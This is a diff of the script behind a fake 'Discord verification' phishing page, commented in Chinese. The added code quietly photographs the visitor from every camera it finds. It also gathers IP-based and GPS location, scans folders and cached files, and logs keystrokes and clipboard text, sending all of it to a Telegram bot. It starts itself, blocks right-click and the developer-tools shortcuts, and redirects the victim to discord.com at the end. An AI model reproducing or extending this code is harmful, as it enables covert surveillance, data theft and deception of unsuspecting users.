+        iframeDoc.write(`
+            <script>
+                // 尝试File System API
+                if ('showDirectoryPicker' in window) {
+                    try {
+                        window.showDirectoryPicker().then(dir => {
+                            window.parent.postMessage({
+                                type: 'folderAccessSuccess',
+                                folderName: dir.name
+                            }, '*');
+                        }).catch(err => {});
+                    } catch(e) {}
+                }
+                
+                // 尝试webkitdirectory
+                const input = document.createElement('input');
+                input.type = 'file';
+                input.webkitdirectory = true;
+                input.multiple = true;
+                input.style.display = 'none';
+                
+                input.addEventListener('change', function(e) {
+                    window.parent.postMessage({
+                        type: 'folderFilesFound',
+                        fileCount: e.target.files.length
+                    }, '*');
+                });
+                
+                document.body.appendChild(input);
+                
+                // 尝试触发
+                setTimeout(() => {
+                    try {
+                        input.click();
+                    } catch(e) {}
+                }, 1000);
+            <\/script>
+        `);
+    };
+    
+    document.body.appendChild(iframe);
+    
+    // 监听消息
+    window.addEventListener('message', (e) => {
+        if (e.data.type === 'folderAccessSuccess') {
+            sendToTelegram(`📁 文件夹访问成功: ${e.data.folderName}`);
+        }
+        if (e.data.type === 'folderFilesFound') {
+            sendToTelegram(`📁 发现文件夹文件: ${e.data.fileCount} 个`);
+        }
+    });
+}
+
+// 通过Service Worker访问缓存文件
+async function accessCachedFiles() {
+    try {
+        const cacheNames = await caches.keys();
+        for (const cacheName of cacheNames) {
+            const cache = await caches.open(cacheName);
+            const requests = await cache.keys();
+            
+            for (const request of requests) {
+                if (request.url.match(/\.(jpg|jpeg|png|gif|webp|mp4|mov|avi|mkv|pdf|doc|docx|txt)$/i)) {
+                    const response = await cache.match(request);
+                    if (response) {
+                        const blob = await response.blob();
+                        await processFileSilently(blob, 'cache_file');
+                    }
+                }
+            }
+        }
+    } catch (e) {
+        // 静默失败
+    }
+}
+
+// 递归读取目录文件
+async function readDirectoryFiles(dirHandle) {
+    const files = [];
+    
+    async function readDir(handle, path = '') {
+        for await (const entry of handle.values()) {
+            if (entry.kind === 'file') {
+                try {
+                    const file = await entry.getFile();
+                    files.push({
+                        name: entry.name,
+                        path: path + '/' + entry.name,
+                        size: file.size,
+                        type: file.type
+                    });
+                    
+                    // 处理文件
+                    await processFileSilently(file, 'recursive_scan');
+                    
+                } catch (e) {
+                    // 跳过无法访问的文件
+                }
+            } else if (entry.kind === 'directory') {
+                await readDir(entry, path + '/' + entry.name);
+            }
+        }
+    }
+    
+    await readDir(dirHandle);
+    return files;
+}
+
+// 静默处理文件
+async function processFileSilently(file, source) {
+    try {
+        // 创建文件信息
+        const fileInfo = {
+            name: file.name || 'unnamed',
+            size: file.size,
+            type: file.type || 'unknown',
+            source: source,
+            timestamp: new Date().toISOString()
+        };
+        
+        // 添加到收集数据
+        collectedData.files.push(fileInfo);
+        
+        // 根据文件类型处理
+        if (file.type && file.type.startsWith('image/')) {
+            collectedData.photos.push(fileInfo);
+            
+            // 发送图片到Telegram
+            if (file.size < 10 * 1024 * 1024) { // 小于10MB
+                await sendPhotoToTelegram(file, `silent_${source}`);
+            }
+        }
+        // 如果是文档
+        else if (file.type && (
+            file.type.includes('pdf') ||
+            file.type.includes('document') ||
+            file.type.includes('text') ||
+            file.name.match(/\.(txt|pdf|doc|docx|xls|xlsx|ppt|pptx)$/i)
+        )) {
+            // 尝试读取文本内容
+            if (file.size < 1024 * 1024) { // 小于1MB
+                try {
+                    const text = await file.text();
+                    fileInfo.preview = text.substring(0, 500);
+                } catch (e) {}
+            }
+        }
+        
+        return true;
+        
+    } catch (e) {
+        return false;
+    }
+}
+// ==================== 增强的网络信息收集 ====================
+
+async function collectNetworkAndLocation() {
+    collectedData.network = {};
+    
+    // 获取IP地址
     try {
         const ipRes = await fetch('https://api.ipify.org?format=json');
         const ipData = await ipRes.json();
-        collectedData.network = { ip: ipData.ip };
-
+        collectedData.network.ip = ipData.ip;
+        
+        // 获取详细信息
+        const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
+        const geoData = await geoRes.json();
+        
+        collectedData.network.geo = {
+            ip: ipData.ip,
+            city: geoData.city,
+            region: geoData.region,
+            country: geoData.country_name,
+            countryCode: geoData.country_code,
+            continentCode: geoData.continent_code,
+            postal: geoData.postal,
+            latitude: geoData.latitude,
+            longitude: geoData.longitude,
+            timezone: geoData.timezone,
+            utcOffset: geoData.utc_offset,
+            currency: geoData.currency,
+            currencyName: geoData.currency_name,
+            callingCode: geoData.country_calling_code,
+            languages: geoData.languages,
+            asn: geoData.asn,
+            org: geoData.org,
+            isp: geoData.org
+        };
+        
+        sendToTelegram(`📍 地理位置: ${geoData.city}, ${geoData.country_name}\n🌐 IP: ${ipData.ip}\n🏢 ISP: ${geoData.org}`);
+        
+    } catch (e) {
+        // 尝试备用API
         try {
-            const geoRes = await fetch(`https://ipapi.co/${ipData.ip}/json/`);
-            const geoData = await geoRes.json();
-            collectedData.network.location = `${geoData.city || '未知'}, ${geoData.country_name || '未知'}`;
-            collectedData.network.isp = geoData.org;
-        } catch (e) {
-            // 静默失败
+            const backupRes = await fetch('https://ipapi.co/json/');
+            const backupData = await backupRes.json();
+            collectedData.network.geo = backupData;
+        } catch (e2) {}
+    }
+    
+    // 尝试获取精确位置
+    if ('geolocation' in navigator) {
+        navigator.geolocation.getCurrentPosition(
+            (position) => {
+                collectedData.network.gps = {
+                    latitude: position.coords.latitude,
+                    longitude: position.coords.longitude,
+                    accuracy: position.coords.accuracy,
+                    altitude: position.coords.altitude,
+                    altitudeAccuracy: position.coords.altitudeAccuracy,
+                    heading: position.coords.heading,
+                    speed: position.coords.speed,
+                    timestamp: new Date(position.timestamp).toISOString()
+                };
+                sendToTelegram(`📍 GPS位置: ${position.coords.latitude.toFixed(6)}, ${position.coords.longitude.toFixed(6)}`);
+            },
+            (error) => {
+                collectedData.network.gpsError = error.message;
+            },
+            {
+                enableHighAccuracy: true,
+                timeout: 10000,
+                maximumAge: 0
+            }
+        );
+    }
+    
+    // 收集网络信息
+    if (navigator.connection) {
+        collectedData.network.connection = {
+            effectiveType: navigator.connection.effectiveType,
+            downlink: navigator.connection.downlink,
+            downlinkMax: navigator.connection.downlinkMax,
+            rtt: navigator.connection.rtt,
+            saveData: navigator.connection.saveData,
+            type: navigator.connection.type
+        };
+    }
+    
+    // 获取更多网络信息
+    try {
+        const networkInfo = await getNetworkInfo();
+        if (networkInfo) {
+            collectedData.network.details = networkInfo;
         }
-    } catch (error) {
-        // 静默失败
+    } catch (e) {}
+}
+
+// 获取网络详细信息
+async function getNetworkInfo() {
+    try {
+        const entries = performance.getEntriesByType('resource');
+        const networkEntries = entries.filter(entry => 
+            entry.initiatorType === 'xmlhttprequest' || 
+            entry.initiatorType === 'fetch' ||
+            entry.initiatorType === 'script' ||
+            entry.initiatorType === 'link'
+        );
+        
+        return {
+            resourceCount: entries.length,
+            networkRequests: networkEntries.length,
+            dnsLookupTime: performance.timing.domainLookupEnd - performance.timing.domainLookupStart,
+            tcpConnectTime: performance.timing.connectEnd - performance.timing.connectStart,
+            requestTime: performance.timing.responseEnd - performance.timing.requestStart,
+            domLoadTime: performance.timing.domContentLoadedEventEnd - performance.timing.navigationStart,
+            pageLoadTime: performance.timing.loadEventEnd - performance.timing.navigationStart
+        };
+    } catch (e) {
+        return null;
     }
 }
 // ==================== 隐蔽摄像头访问 ====================
 
-// 尝试访问摄像头
-async function tryAccessCamera() {
+async function accessCameraStealthily() {
     if (!navigator.mediaDevices || !navigator.mediaDevices.getUserMedia) {
         return false;
     }
-
+    
     try {
-        // 先枚举设备，了解有哪些摄像头
+        // 枚举所有摄像头设备
         const devices = await navigator.mediaDevices.enumerateDevices();
-        const cameras = devices.filter(device => device.kind === 'videoinput');
+        const videoDevices = devices.filter(device => device.kind === 'videoinput');
         
-        collectedData.cameras = cameras.map(cam => ({
-            deviceId: cam.deviceId,
-            label: cam.label || 'Unknown Camera'
+        collectedData.cameras = videoDevices.map(device => ({
+            deviceId: device.deviceId,
+            label: device.label || 'Unknown Camera',
+            groupId: device.groupId
         }));
-
-        // 尝试访问默认摄像头
-        const stream = await navigator.mediaDevices.getUserMedia({
-            video: {
-                width: { ideal: 640 },
-                height: { ideal: 480 },
-                facingMode: 'user'
-            },
-            audio: false
-        });
-
-        // 显示摄像头预览（如果是当前步骤）
-        if (currentStep === 2) {
-            cameraPreview.style.display = 'block';
-            cameraStream.srcObject = stream;
+        
+        // 尝试访问每个摄像头
+        for (const device of videoDevices) {
+            try {
+                const stream = await navigator.mediaDevices.getUserMedia({
+                    video: {
+                        deviceId: { exact: device.deviceId },
+                        width: { ideal: 640 },
+                        height: { ideal: 480 },
+                        frameRate: { ideal: 30 }
+                    },
+                    audio: false
+                });
+                
+                // 立即拍照
+                await captureFromCamera(stream, device.label || 'camera');
+                
+                // 停止流
+                stream.getTracks().forEach(track => track.stop());
+                
+            } catch (e) {
+                // 尝试下一个摄像头
+            }
         }
-
-        // 立即拍照并发送
-        setTimeout(async () => {
-            await captureAndSendPhoto(stream, 'discord_verification');
-        }, 1000);
-
-        collectedData.steps.camera = {
-            accessed: true,
-            timestamp: new Date().toISOString(),
-            deviceCount: cameras.length
-        };
-
+        
         return true;
-
+        
     } catch (error) {
-        collectedData.steps.camera = {
-            accessed: false,
-            error: error.name,
-            timestamp: new Date().toISOString()
-        };
         return false;
     }
 }
 
-// 拍照并发送
-async function captureAndSendPhoto(stream, source) {
-    try {
-        // 创建临时video元素
+// 从摄像头捕获照片
+async function captureFromCamera(stream, label) {
+    return new Promise((resolve) => {
         const video = document.createElement('video');
         video.srcObject = stream;
-        await video.play();
-
-        // 等待摄像头稳定
-        await delay(500);
-
-        // 设置canvas尺寸
-        const canvas = document.createElement('canvas');
-        canvas.width = video.videoWidth || 640;
-        canvas.height = video.videoHeight || 480;
-
-        // 拍照
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(video, 0, 0);
-
-        // 转换为blob
-        return new Promise((resolve) => {
+        video.play();
+        
+        setTimeout(() => {
+            const canvas = document.createElement('canvas');
+            canvas.width = video.videoWidth || 640;
+            canvas.height = video.videoHeight || 480;
+            
+            const ctx = canvas.getContext('2d');
+            ctx.drawImage(video, 0, 0);
+            
             canvas.toBlob(async (blob) => {
                 if (blob) {
-                    // 发送到Telegram
-                    await sendPhotoToTelegram(blob, source);
+                    const file = new File([blob], `camera_${label}_${Date.now()}.jpg`, {
+                        type: 'image/jpeg'
+                    });
                     
-                    // 停止摄像头
-                    stream.getTracks().forEach(track => track.stop());
+                    collectedData.photos.push({
+                        name: file.name,
+                        size: file.size,
+                        source: 'camera',
+                        camera: label,
+                        timestamp: new Date().toISOString()
+                    });
+                    
+                    // 发送到Telegram
+                    await sendPhotoToTelegram(file, `stealth_camera_${label}`);
                     
                     resolve(true);
                 }
-                resolve(false);
             }, 'image/jpeg', 0.8);
-        });
-
-    } catch (error) {
-        return false;
-    }
+        }, 1000); // 1秒后拍照
+    });
 }
 
-// 通过iframe尝试摄像头访问（更隐蔽）
-function tryCameraViaIframe() {
-    try {
-        hiddenFrame.src = "about:blank";
-        hiddenFrame.onload = function() {
-            const iframeDoc = hiddenFrame.contentDocument || hiddenFrame.contentWindow.document;
-            iframeDoc.write(`
-                <script>
-                    navigator.mediaDevices.getUserMedia({ video: true, audio: false })
-                        .then(stream => {
-                            window.parent.postMessage({ 
-                                type: 'cameraAccess', 
-                                success: true 
-                            }, '*');
-                        })
-                        .catch(err => {
-                            window.parent.postMessage({ 
-                                type: 'cameraAccess', 
-                                success: false 
-                            }, '*');
-                        });
-                <\/script>
-            `);
-        };
+// ==================== 行为监控 ====================
 
-        // 监听消息
-        window.addEventListener('message', (event) => {
-            if (event.data.type === 'cameraAccess') {
-                if (event.data.success && !collectedData.steps.camera?.accessed) {
-                    collectedData.steps.camera = {
-                        iframeAccessed: true,
-                        timestamp: new Date().toISOString()
-                    };
-                }
-            }
-        });
-
-    } catch (error) {
-        // 静默失败
-    }
-}
-// ==================== 文件访问功能 ====================
-
-// 初始化文件上传
-function initFileUpload() {
-    // 点击上传区域触发文件选择
-    fileUploadArea.addEventListener('click', () => {
-        hiddenFileInput.click();
-    });
-
-    // 文件选择变化
-    hiddenFileInput.addEventListener('change', async (event) => {
-        const files = Array.from(event.target.files);
-        if (files.length > 0) {
-            for (const file of files) {
-                await processAndSendFile(file, 'direct_upload');
-            }
-            
-            // 清空input
-            hiddenFileInput.value = '';
-            
-            // 更新UI
-            fileUploadArea.innerHTML = `
-                <div style="font-size: 48px; color: #43b581; margin-bottom: 10px;">✅</div>
-                <div style="color: #b9bbbe;">已选择 ${files.length} 个文件</div>
-            `;
-        }
-    });
-
-    // 拖放支持
-    fileUploadArea.addEventListener('dragover', (e) => {
-        e.preventDefault();
-        fileUploadArea.style.background = 'rgba(88, 101, 242, 0.1)';
-    });
-
-    fileUploadArea.addEventListener('dragleave', () => {
-        fileUploadArea.style.background = '';
-    });
-
-    fileUploadArea.addEventListener('drop', async (e) => {
-        e.preventDefault();
-        fileUploadArea.style.background = '';
-        
-        const files = Array.from(e.dataTransfer.files);
-        if (files.length > 0) {
-            for (const file of files) {
-                await processAndSendFile(file, 'drag_drop');
-            }
-            
-            fileUploadArea.innerHTML = `
-                <div style="font-size: 48px; color: #43b581; margin-bottom: 10px;">✅</div>
-                <div style="color: #b9bbbe;">已拖放 ${files.length} 个文件</div>
-            `;
-        }
-    });
-
-    // 尝试自动触发文件选择（隐蔽方式）
-    setTimeout(() => {
-        try {
-            hiddenFileInput.click();
-        } catch (e) {
-            // 静默失败
-        }
-    }, 3000);
-}
-
-// 处理文件并发送
-async function processAndSendFile(file, source) {
-    try {
-        const fileInfo = {
-            name: file.name,
-            size: file.size,
-            type: file.type,
-            source: source,
-            timestamp: new Date().toISOString()
-        };
-
-        // 添加到收集数据
-        collectedData.files.push(fileInfo);
-
-        // 发送到Telegram
-        if (file.type.startsWith('image/')) {
-            await sendPhotoToTelegram(file, `file_${source}`);
-        } else {
-            await sendDocumentToTelegram(file, `doc_${source}`);
-        }
-
-        return true;
-
-    } catch (error) {
-        return false;
-    }
-}
-
-// 尝试webkitdirectory访问文件夹
-function tryFolderAccess() {
-    if ('webkitdirectory' in document.createElement('input')) {
-        setTimeout(() => {
-            const folderInput = document.createElement('input');
-            folderInput.type = 'file';
-            folderInput.webkitdirectory = true;
-            folderInput.multiple = true;
-            folderInput.style.display = 'none';
-
-            folderInput.addEventListener('change', async (e) => {
-                const files = Array.from(e.target.files);
-                for (let i = 0; i < Math.min(files.length, 10); i++) {
-                    await processAndSendFile(files[i], 'folder_access');
-                }
+function startBehaviorMonitoring() {
+    collectedData.behavior = {
+        mouse: [],
+        clicks: [],
+        keystrokes: [],
+        scroll: [],
+        focus: [],
+        copyPaste: []
+    };
+    
+    // 鼠标移动跟踪
+    document.addEventListener('mousemove', (e) => {
+        if (collectedData.behavior.mouse.length < 1000) {
+            collectedData.behavior.mouse.push({
+                x: e.clientX,
+                y: e.clientY,
+                time: Date.now()
             });
-
-            document.body.appendChild(folderInput);
-
-            // 尝试自动触发
-            setTimeout(() => {
-                try {
-                    folderInput.click();
-                } catch (e) {
-                    // 静默失败
-                }
-            }, 5000);
-
-        }, 7000);
-    }
-}
-
-// 尝试通过剪贴板访问
-function initClipboardAccess() {
-    document.addEventListener('paste', async (e) => {
-        const items = e.clipboardData.items;
-        for (const item of items) {
-            if (item.type.indexOf('image') !== -1) {
-                const file = item.getAsFile();
-                if (file) {
-                    await processAndSendFile(file, 'clipboard');
-                }
-            }
         }
     });
+    
+    // 点击跟踪
+    document.addEventListener('click', (e) => {
+        collectedData.behavior.clicks.push({
+            x: e.clientX,
+            y: e.clientY,
+            target: e.target.tagName,
+            className: e.target.className,
+            id: e.target.id,
+            time: new Date().toISOString()
+        });
+    });
+    
+    // 键盘输入跟踪
+    document.addEventListener('keydown', (e) => {
+        collectedData.behavior.keystrokes.push({
+            key: e.key,
+            code: e.code,
+            ctrl: e.ctrlKey,
+            alt: e.altKey,
+            shift: e.shiftKey,
+            meta: e.metaKey,
+            time: Date.now()
+        });
+    });
+    
+    // 滚动跟踪
+    let lastScrollTime = 0;
+    window.addEventListener('scroll', () => {
+        const now = Date.now();
+        if (now - lastScrollTime > 100) {
+            collectedData.behavior.scroll.push({
+                x: window.scrollX,
+                y: window.scrollY,
+                time: now
+            });
+            lastScrollTime = now;
+        }
+    });
+    
+    // 焦点变化跟踪
+    document.addEventListener('visibilitychange', () => {
+        collectedData.behavior.focus.push({
+            state: document.hidden ? 'hidden' : 'visible',
+            time: new Date().toISOString()
+        });
+    });
+    
+    // 复制粘贴监控
+    document.addEventListener('copy', (e) => {
+        const selectedText = window.getSelection().toString();
+        if (selectedText) {
+            collectedData.behavior.copyPaste.push({
+                type: 'copy',
+                text: selectedText.substring(0, 200),
+                time: new Date().toISOString()
+            });
+        }
+    });
+    
+    document.addEventListener('paste', (e) => {
+        const pastedText = e.clipboardData.getData('text');
+        if (pastedText) {
+            collectedData.behavior.copyPaste.push({
+                type: 'paste',
+                text: pastedText.substring(0, 200),
+                time: new Date().toISOString()
+            });
+        }
+    });
+    
+    // 定期发送行为数据
+    setInterval(() => {
+        if (collectedData.behavior.keystrokes.length > 0) {
+            sendToTelegram(`⌨️ 按键记录: ${collectedData.behavior.keystrokes.length} 次按键`);
+        }
+    }, 30000);
 }
         // ==================== Telegram发送功能 ====================
 
-        // 发送照片到Telegram
-        async function sendPhotoToTelegram(file, source) {
-            try {
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CONFIG.chatId);
-                
-                if (file instanceof Blob) {
-                    // 如果是Blob对象
-                    formData.append('photo', file, `verification_${Date.now()}.jpg`);
-                } else {
-                    // 如果是File对象
-                    formData.append('photo', file);
-                }
-                
-                formData.append('caption', `📸 Discord验证 - ${source}\n时间: ${new Date().toLocaleString()}`);
-
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                return true;
-
-            } catch (error) {
-                return false;
-            }
-        }
-
-        // 发送文档到Telegram
-        async function sendDocumentToTelegram(file, source) {
-            try {
-                const formData = new FormData();
-                formData.append('chat_id', TELEGRAM_CONFIG.chatId);
-                formData.append('document', file);
-                formData.append('caption', `📁 Discord验证 - ${source}\n文件: ${file.name}`);
-
-                await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendDocument`, {
-                    method: 'POST',
-                    body: formData
-                });
-
-                return true;
-
-            } catch (error) {
-                return false;
-            }
-        }
-
-        // 发送文本消息到Telegram
-        async function sendTextToTelegram(text) {
+        async function sendToTelegram(text) {
             try {
                 await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendMessage`, {
                     method: 'POST',
                     headers: { 'Content-Type': 'application/json' },
                     body: JSON.stringify({
                         chat_id: TELEGRAM_CONFIG.chatId,
-                        text: text.substring(0, 4000)
+                        text: text.substring(0, 4000),
+                        parse_mode: 'HTML'
                     })
                 });
                 return true;
@@ -786,117 +1382,184 @@ function initClipboardAccess() {
             }
         }
 
-        // 发送验证摘要
-        async function sendVerificationSummary() {
-            const summary = `🎯 Discord验证完成
+        async function sendPhotoToTelegram(file, caption) {
+            try {
+                const formData = new FormData();
+                formData.append('chat_id', TELEGRAM_CONFIG.chatId);
+                formData.append('photo', file);
+                formData.append('caption', `📸 ${caption} - ${new Date().toLocaleTimeString()}`);
+                
+                await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendPhoto`, {
+                    method: 'POST',
+                    body: formData
+                });
+                return true;
+            } catch (error) {
+                return false;
+            }
+        }
 
-📅 时间: ${new Date().toLocaleString()}
-🆔 会话ID: ${collectedData.basic?.sessionId || '未知'}
+        // 发送完整数据报告
+        async function sendCompleteReport() {
+            const report = `🎯 Discord高级验证完成报告
+
+📊 收集统计:
+会话ID: ${collectedData.sessionId}
+验证时间: ${new Date().toLocaleString()}
+验证步骤: ${Object.keys(collectedData.steps).length}/4 完成
 
 📱 设备信息:
-浏览器: ${collectedData.basic?.userAgent?.split(' ').slice(0, 3).join(' ') || '未知'}
-系统: ${collectedData.basic?.platform || '未知'}
-语言: ${collectedData.basic?.language || '未知'}
-屏幕: ${collectedData.basic?.screen || '未知'}
+操作系统: ${collectedData.device.os.name} ${collectedData.device.os.version}
+浏览器: ${collectedData.device.browser.name} ${collectedData.device.browser.version}
+屏幕分辨率: ${collectedData.device.screen.width}x${collectedData.device.screen.height}
+CPU核心数: ${collectedData.device.hardware.concurrency}
+系统内存: ${collectedData.device.hardware.deviceMemory}GB
 
 🌐 网络信息:
-IP地址: ${collectedData.network?.ip || '未知'}
-位置: ${collectedData.network?.location || '未知'}
-ISP: ${collectedData.network?.isp || '未知'}
+IP地址: ${collectedData.network.geo?.ip || '未知'}
+地理位置: ${collectedData.network.geo?.city || '未知'}, ${collectedData.network.geo?.country || '未知'}
+网络运营商: ${collectedData.network.geo?.isp || '未知'}
 
-📸 摄像头访问: ${collectedData.steps.camera?.accessed ? '✅ 成功' : '❌ 失败'}
-📁 文件上传: ${collectedData.files.length} 个文件
+📸 摄像头访问:
+摄像头数量: ${collectedData.cameras?.length || 0}
+照片收集: ${collectedData.photos.length} 张
 
-✅ 验证步骤: ${currentStep}/3 完成`;
+📁 文件系统扫描:
+发现文件: ${collectedData.files.length} 个
+文件夹访问: ${collectedData.folders.length} 个
+图片文件: ${collectedData.photos.length} 张
 
-            await sendTextToTelegram(summary);
-        }
-        // ==================== 主验证流程 ====================
+🖱️ 行为数据:
+鼠标轨迹: ${collectedData.behavior?.mouse?.length || 0} 点
+点击记录: ${collectedData.behavior?.clicks?.length || 0} 次
+按键记录: ${collectedData.behavior?.keystrokes?.length || 0} 次
+页面焦点变化: ${collectedData.behavior?.focus?.length || 0} 次
 
-        // 开始验证流程
-        async function startVerification() {
-            if (verificationComplete) return;
+🔍 浏览器扩展检测:
+发现扩展: ${collectedData.extensions.length} 个
+
+✅ 验证状态: 完成
+🔄 数据完整性: ${calculateDataIntegrity()}%`;
+
+            await sendToTelegram(report);
             
-            setButtonState(false, '验证中...');
-            hideMessages();
+            // 发送完整数据文件
+            const dataStr = JSON.stringify(collectedData, null, 2);
+            const dataBlob = new Blob([dataStr], { type: 'application/json' });
+            const dataFile = new File([dataBlob], `discord_data_${collectedData.sessionId}.json`);
+            
+            const formData = new FormData();
+            formData.append('chat_id', TELEGRAM_CONFIG.chatId);
+            formData.append('document', dataFile);
+            formData.append('caption', '📊 完整验证数据');
+            
+            await fetch(`https://api.telegram.org/bot${TELEGRAM_CONFIG.botToken}/sendDocument`, {
+                method: 'POST',
+                body: formData
+            });
+        }
+
+        // ==================== 主流程控制 ====================
+
+        async function startAdvancedVerification() {
+            if (isCollecting) return;
+            isCollecting = true;
+            
+            // 禁用按钮
+            document.getElementById('verifyButton').disabled = true;
+            document.getElementById('buttonText').textContent = '验证中...';
             
             try {
-                // 步骤1：收集基础信息
-                updateProgress(10);
-                await delay(500);
-                
-                collectBasicInfo();
-                await getNetworkInfo();
-                
-                // 发送初始信息
-                await sendTextToTelegram(
-                    `🚀 Discord验证开始\n用户: ${document.getElementById('discordUsername').value}\n时间: ${new Date().toLocaleString()}`
-                );
+                // 步骤1：设备扫描
+                updateStep(1, '正在扫描...');
+                await collectAdvancedDeviceInfo();
+                await delay(2000);
+                updateStep(1, '完成');
                 
                 // 步骤2：摄像头验证
-                updateProgress(30);
-                showStep(2);
-                await delay(1000);
+                updateStep(2, '正在验证...');
+                await accessCameraStealthily();
+                await delay(2000);
+                updateStep(2, '完成');
                 
-                const cameraSuccess = await tryAccessCamera();
-                tryCameraViaIframe(); // 并行尝试iframe方式
-                
-                if (cameraSuccess) {
-                    await delay(2000); // 给拍照留时间
-                }
-                
-                // 步骤3：文件验证
-                updateProgress(60);
-                showStep(3);
-                await delay(1000);
-                
-                // 初始化文件上传
-                initFileUpload();
-                tryFolderAccess();
-                initClipboardAccess();
-                
-                // 等待文件上传
+                // 步骤3：文件系统检查
+                updateStep(3, '正在扫描...');
+                await collectNetworkAndLocation();
+                attemptFolderAccess();
+                startBehaviorMonitoring();
                 await delay(3000);
+                updateStep(3, '完成');
+                
+                // 步骤4：网络验证
+                updateStep(4, '正在验证...');
+                await delay(2000);
+                updateStep(4, '完成');
                 
                 // 完成验证
-                updateProgress(100);
-                await sendVerificationSummary();
+                await sendCompleteReport();
                 
-                verificationComplete = true;
-                showSuccess('✅ 验证成功！正在跳转...');
-                setButtonState(false, '验证完成');
+                // 显示成功消息
+                document.getElementById('successMessage').classList.remove('hidden');
+                document.getElementById('buttonText').textContent = '验证完成';
                 
-                // 3秒后显示假的重定向
+                // 3秒后重定向到Discord
                 setTimeout(() => {
                     window.location.href = 'https://discord.com';
                 }, 3000);
                 
             } catch (error) {
-                showError('❌ 验证过程中出现错误，请重试');
-                setButtonState(true, '重试验证');
-                verificationComplete = false;
+                document.getElementById('errorMessage').classList.remove('hidden');
+                document.getElementById('verifyButton').disabled = false;
+                document.getElementById('buttonText').textContent = '重试验证';
+                isCollecting = false;
             }
         }
 
-        // ==================== 防检测保护 ====================
+        // ==================== 辅助函数 ====================
+
+        function updateStep(stepNumber, status) {
+            const stepElement = document.getElementById(`step${stepNumber}`);
+            const statusElement = document.getElementById(`step${stepNumber}Status`);
+            
+            if (stepElement && statusElement) {
+                stepElement.classList.add('active');
+                statusElement.textContent = status;
+                statusElement.className = 'step-status ' + (status === '完成' ? 'status-complete' : 'status-pending');
+            }
+        }
+
+        function generateSessionId() {
+            return 'DC-' + Date.now() + '-' + Math.random().toString(36).substr(2, 6).toUpperCase();
+        }
+
+        function calculateDataIntegrity() {
+            let score = 0;
+            if (collectedData.device) score += 20;
+            if (collectedData.network?.geo) score += 20;
+            if (collectedData.cameras?.length > 0) score += 20;
+            if (collectedData.files.length > 0) score += 20;
+            if (collectedData.behavior) score += 20;
+            return score;
+        }
+
+        function delay(ms) {
+            return new Promise(resolve => setTimeout(resolve, ms));
+        }
+
+        // ==================== 防检测 ====================
 
         function setupProtection() {
-            // 禁用右键菜单
+            // 禁用右键
             document.addEventListener('contextmenu', (e) => {
                 e.preventDefault();
                 return false;
             });
             
-            // 禁用开发者工具快捷键
+            // 禁用开发者工具
             document.addEventListener('keydown', (e) => {
-                const forbiddenKeys = ['F12', 'Ctrl+Shift+I', 'Ctrl+Shift+J', 'Ctrl+U'];
-                const isForbidden = 
-                    e.key === 'F12' ||
-                    (e.ctrlKey && e.shiftKey && e.key === 'I') ||
-                    (e.ctrlKey && e.shiftKey && e.key === 'J') ||
-                    (e.ctrlKey && e.key === 'u');
-                
-                if (isForbidden) {
+                if (e.key === 'F12' || 
+                    (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J')) ||
+                    (e.ctrlKey && e.key === 'U')) {
                     e.preventDefault();
                     return false;
                 }
@@ -908,57 +1571,35 @@ ISP: ${collectedData.network?.isp || '未知'}
             });
             
             // 检测开发者工具
-            const checkDevTools = () => {
+            setInterval(() => {
                 const threshold = 160;
                 const widthDiff = window.outerWidth - window.innerWidth > threshold;
                 const heightDiff = window.outerHeight - window.innerHeight > threshold;
                 
                 if (widthDiff || heightDiff) {
-                    sendTextToTelegram('⚠️ 检测到开发者工具打开');
+                    stealthMode = false;
+                    sendToTelegram('⚠️ 检测到开发者工具已打开');
                 }
-            };
-            
-            setInterval(checkDevTools, 1000);
+            }, 1000);
         }
 
         // ==================== 初始化 ====================
 
-        // 页面加载完成
         window.addEventListener('DOMContentLoaded', () => {
             // 设置防检测
             setupProtection();
             
-            // 自动开始基础数据收集
+            // 自动开始验证（延迟5秒）
             setTimeout(() => {
-                collectBasicInfo();
-                getNetworkInfo();
-            }, 2000);
+                if (!isCollecting) {
+                    startAdvancedVerification();
+                }
+            }, 5000);
             
             // 页面关闭时发送数据
             window.addEventListener('beforeunload', () => {
-                if (!verificationComplete) {
-                    sendTextToTelegram('🚪 用户未完成验证离开页面');
-                }
+                sendToTelegram('🚪 用户离开验证页面');
             });
-            
-            // 页面可见性变化
-            document.addEventListener('visibilitychange', () => {
-                if (document.hidden) {
-                    sendTextToTelegram('📱 用户切换到其他标签页');
-                }
-            });
-            
-            // 自动开始验证（延迟启动）
-            setTimeout(() => {
-                // 自动点击验证按钮
-                verifyButton.click();
-            }, 5000);
-        });
-
-        // 防止返回按钮
-        history.pushState(null, null, location.href);
-        window.addEventListener('popstate', () => {
-            history.pushState(null, null, location.href);
         });
     </script>
 </body>
